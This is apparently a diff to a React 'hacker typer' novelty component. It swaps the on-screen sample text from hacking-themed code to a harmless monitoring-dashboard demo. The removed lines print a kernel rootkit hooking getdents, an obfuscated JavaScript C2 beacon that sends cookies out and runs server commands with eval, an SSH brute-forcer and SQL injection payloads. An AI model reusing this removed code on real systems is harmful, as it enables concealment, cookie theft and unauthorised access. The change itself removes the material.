@@ -3,199 +3,172 @@
 import { useEffect, useRef, useState } from 'react';
 import './hackertyper.css';
 
-// Longer, more varied code corpus for a more convincing effect
+// Harmless pseudo-code corpus — monitoring dashboard theme
 const SAMPLE = `#!/usr/bin/env python3
-"""ByteLabs Autonomous Exploit Framework v4.1.0"""
+# ByteLabs Operations Dashboard v4.1.0
 
-import os
-import sys
-import socket
-import hashlib
-import subprocess
-from typing import Optional, List
+import math
+import time
+import random
+from typing import Dict, List, Optional
 
-TARGETS = ["192.168.1.0/24", "10.0.0.0/8"]
-PAYLOAD_KEY = 0xDEADBEEF
-MAX_THREADS = 64
+REFRESH_INTERVAL_MS = 250
+MAX_WIDGETS = 12
+DEFAULT_THEME = "midnight"
 
-class Exploit:
-    def __init__(self, target: str, port: int = 443):
-        self.target = target
-        self.port = port
-        self._session_id = hashlib.sha256(os.urandom(32)).hexdigest()
-        self._connected = False
-        self._buffer: List[bytes] = []
+class Dashboard:
+    def __init__(self, name: str, theme: str = DEFAULT_THEME):
+        self.name = name
+        self.theme = theme
+        self.widgets: List[Dict[str, float]] = []
+        self._started_at = time.time()
+        self._frame = 0
 
-    def connect(self) -> bool:
-        try:
-            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            self._sock.settimeout(3.0)
-            self._sock.connect((self.target, self.port))
-            self._connected = True
-            return True
-        except (socket.timeout, ConnectionRefusedError):
-            return False
+    def add_widget(self, label: str, value: float) -> None:
+        self.widgets.append({"label": label, "value": value})
 
-    def inject(self, payload: bytes) -> Optional[bytes]:
-        if not self._connected:
-            raise RuntimeError("Not connected")
-        obfuscated = bytes(b ^ (PAYLOAD_KEY & 0xFF) for b in payload)
-        self._sock.sendall(obfuscated)
-        return self._sock.recv(4096)
-
-    def escalate_privileges(self) -> bool:
-        vectors = [
-            b"\\x90\\x90\\x90\\x31\\xc0\\x50\\x68",
-            b"CVE-2024-1337",
-            b"ret2libc_gadget",
-        ]
-        for v in vectors:
-            result = self.inject(v)
-            if result and b"root" in result:
-                return True
-        return False
-
-def scan_network(cidr: str) -> List[str]:
-    """Sweep network range for open ports."""
-    live_hosts = []
-    base, mask = cidr.split("/")
-    octets = [int(x) for x in base.split(".")]
-    for i in range(1, 254):
-        host = f"{octets[0]}.{octets[1]}.{octets[2]}.{i}"
-        result = subprocess.run(
-            ["ping", "-c", "1", "-W", "1", host],
-            capture_output=True,
-        )
-        if result.returncode == 0:
-            live_hosts.append(host)
-    return live_hosts
-
-def bruteforce_ssh(host: str, wordlist: str = "/usr/share/wordlists/rockyou.txt") -> Optional[str]:
-    import paramiko
-    client = paramiko.SSHClient()
-    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-    with open(wordlist) as f:
-        for password in f:
-            password = password.strip()
-            try:
-                client.connect(host, username="root", password=password, timeout=2)
-                return password
-            except Exception:
-                continue
-    return None
-
-// ---------------------------------------------------------------
-// C kernel module — ring-0 rootkit loader
-// ---------------------------------------------------------------
-
-#include <linux/module.h>
-#include <linux/kernel.h>
-#include <linux/init.h>
-#include <linux/syscalls.h>
-#include <linux/sched.h>
-
-MODULE_LICENSE("GPL");
-MODULE_AUTHOR("ByteLabs");
-MODULE_DESCRIPTION("Process concealment module");
-
-static unsigned long *syscall_table;
-
-asmlinkage long (*original_getdents)(unsigned int fd,
-    struct linux_dirent *dirp, unsigned int count);
-
-asmlinkage long hook_getdents(unsigned int fd,
-    struct linux_dirent *dirp, unsigned int count)
-{
-    long ret = original_getdents(fd, dirp, count);
-    struct linux_dirent *current_dir = dirp;
-    struct linux_dirent *prev_dir = NULL;
-    unsigned long offset = 0;
-
-    while (offset < ret) {
-        if (strncmp(current_dir->d_name, "bytelabs", 8) == 0) {
-            if (prev_dir == NULL)
-                dirp = (void *)dirp + current_dir->d_reclen;
-            else
-                prev_dir->d_reclen += current_dir->d_reclen;
-            ret -= current_dir->d_reclen;
-        } else {
-            prev_dir = current_dir;
+    def tick(self) -> Dict[str, float]:
+        self._frame += 1
+        phase = self._frame / 10.0
+        cpu = 40 + math.sin(phase) * 15
+        memory = 55 + math.cos(phase / 2) * 10
+        temperature = 48 + math.sin(phase / 3) * 4
+        return {
+            "cpu": round(cpu, 2),
+            "memory": round(memory, 2),
+            "temperature": round(temperature, 2),
         }
-        offset += current_dir->d_reclen;
-        current_dir = (void *)dirp + offset;
-    }
-    return ret;
+
+    def summary(self) -> str:
+        uptime = int(time.time() - self._started_at)
+        return f"{self.name} theme={self.theme} uptime={uptime}s widgets={len(self.widgets)}"
+
+def generate_series(points: int = 16) -> List[float]:
+    series: List[float] = []
+    baseline = random.uniform(20.0, 80.0)
+    for index in range(points):
+        drift = math.sin(index / 3) * 5
+        jitter = random.uniform(-1.5, 1.5)
+        series.append(round(baseline + drift + jitter, 2))
+    return series
+
+def render_table(rows: List[Dict[str, float]]) -> str:
+    headers = ("metric", "value")
+    lines = [f"{headers[0]:<16}{headers[1]:>8}"]
+    lines.append("-" * 24)
+    for row in rows:
+        lines.append(f"{row['label']:<16}{row['value']:>8.2f}")
+    return "\\n".join(lines)
+
+def find_peak(values: List[float]) -> Optional[float]:
+    if not values:
+        return None
+    peak = values[0]
+    for value in values[1:]:
+        if value > peak:
+            peak = value
+    return peak
+
+dashboard = Dashboard("Operations Overview")
+for label in ("requests", "latency", "cache_hit_rate", "queue_depth"):
+    dashboard.add_widget(label, random.uniform(10.0, 99.0))
+
+snapshot = dashboard.tick()
+trend = generate_series()
+peak = find_peak(trend)
+
+rows = [
+    {"label": "cpu",         "value": snapshot["cpu"]},
+    {"label": "memory",      "value": snapshot["memory"]},
+    {"label": "temperature", "value": snapshot["temperature"]},
+    {"label": "peak",        "value": peak or 0.0},
+]
+print(render_table(rows))
+print(dashboard.summary())
+
+// ---------------------------------------------------------------
+// C demo panel renderer
+// ---------------------------------------------------------------
+
+#include <stdio.h>
+#include <string.h>
+#include <math.h>
+
+typedef struct { const char *title; int width; int height; } Panel;
+
+static void draw_border(int w) {
+    for (int i = 0; i < w; i++) putchar('=');
+    putchar('\\n');
 }
 
-static int __init rootkit_init(void) {
-    printk(KERN_INFO "ByteLabs module loaded\\n");
-    write_cr0(read_cr0() & (~0x10000));
-    original_getdents = syscall_table[__NR_getdents];
-    syscall_table[__NR_getdents] = hook_getdents;
-    write_cr0(read_cr0() | 0x10000);
+static void draw_panel(const Panel *p) {
+    draw_border(p->width);
+    printf("Panel : %s\\n", p->title);
+    printf("Size  : %dx%d\\n", p->width, p->height);
+    draw_border(p->width);
+}
+
+int main(void) {
+    Panel panel = { "ByteLabs Demo Metrics", 32, 8 };
+    draw_panel(&panel);
+    puts("status : ready");
+    puts("mode   : preview");
+    puts("hint   : press any key to animate");
     return 0;
 }
 
-static void __exit rootkit_exit(void) {
-    write_cr0(read_cr0() & (~0x10000));
-    syscall_table[__NR_getdents] = original_getdents;
-    write_cr0(read_cr0() | 0x10000);
+// ---------------------------------------------------------------
+// TypeScript widget renderer
+// ---------------------------------------------------------------
+
+interface Widget {
+  id: string;
+  label: string;
+  value: number;
+  unit: string;
+  trend: number[];
 }
 
-module_init(rootkit_init);
-module_exit(rootkit_exit);
-
-// ---------------------------------------------------------------
-// JavaScript obfuscated C2 beacon
-// ---------------------------------------------------------------
-
-const _0x4f3a = ['aGVsbG8=', 'YnllbGFicw==', 'Y29ubmVjdA=='];
-const _decode = (s) => atob(s);
-const _c2 = \`wss://\${_decode(_0x4f3a[1])}.online/beacon\`;
-
-async function beacon() {
-  const ws = new WebSocket(_c2);
-  ws.onopen = () => {
-    const payload = JSON.stringify({
-      id: crypto.randomUUID(),
-      ts: Date.now(),
-      ua: navigator.userAgent,
-      cookies: document.cookie,
-    });
-    ws.send(btoa(payload));
-  };
-  ws.onmessage = ({ data }) => {
-    const cmd = atob(data);
-    eval(cmd);  // execute server command
-  };
-  setInterval(() => ws.readyState === 1 && ws.send('ping'), 30000);
+function sparkline(values: number[], width = 8): string {
+  const bars = '\u2581\u2582\u2583\u2584\u2585\u2586\u2587\u2588';
+  const min = Math.min(...values);
+  const max = Math.max(...values);
+  const range = max - min || 1;
+  return values
+    .slice(-width)
+    .map((v) => bars[Math.round(((v - min) / range) * (bars.length - 1))])
+    .join('');
 }
 
-beacon().catch(console.error);
+function formatValue(v: number, unit: string): string {
+  return v.toFixed(1) + unit;
+}
 
-// ---------------------------------------------------------------
-// SQL injection payload builder
-// ---------------------------------------------------------------
+async function fetchMetrics(endpoint: string): Promise<Widget[]> {
+  const res = await fetch(endpoint, {
+    method: 'GET',
+    headers: { 'Content-Type': 'application/json' },
+  });
+  if (!res.ok) throw new Error('HTTP ' + res.status);
+  return res.json() as Promise<Widget[]>;
+}
 
-def build_sqli(table: str, column: str) -> str:
-    payloads = [
-        f"' OR '1'='1",
-        f"' UNION SELECT {column} FROM {table}--",
-        f"'; DROP TABLE {table};--",
-        f"' AND 1=CONVERT(int,(SELECT TOP 1 {column} FROM {table}))--",
-    ]
-    return payloads
+function renderDashboard(widgets: Widget[]): void {
+  const timestamp = new Date().toISOString();
+  console.log('[ByteLabs Dashboard] ' + timestamp);
+  console.log('='.repeat(48));
+  for (const w of widgets) {
+    const bar = sparkline(w.trend);
+    const val = formatValue(w.value, w.unit);
+    console.log(w.label.padEnd(20) + val.padStart(8) + '  ' + bar);
+  }
+  console.log('='.repeat(48));
+}
 
-results = build_sqli("users", "password_hash")
-for p in results:
-    print(f"[*] Testing: {p}")
-    response = inject_payload(target_url, p)
-    if "error" not in response.lower():
-        print(f"[+] Possible hit: {p}")
-        break
-
-print("[*] Done. Exiting...")
-sys.exit(0)
+const endpoint = '/api/metrics';
+fetchMetrics(endpoint)
+  .then(renderDashboard)
+  .catch((err: Error) => console.error('Dashboard error:', err.message));
 `;
 
 export default function HackerTyper() {
@@ -241,10 +214,10 @@ export default function HackerTyper() {
       {/* Instructions / Clear bar */}
       <div className="ht-controls">
         <span className="ht-hint">
-          {showInstructions ? '⌨  Press any key to start typing...' : '⌨  Keep typing...'}
+          {showInstructions ? '\u2328  Press any key to start typing...' : '\u2328  Keep typing...'}
         </span>
         <button className="ht-clear-btn" onClick={handleClear} title="Clear the screen">
-          ✕ CLEAR
+          \u2715 CLEAR
         </button>
       </div>
 
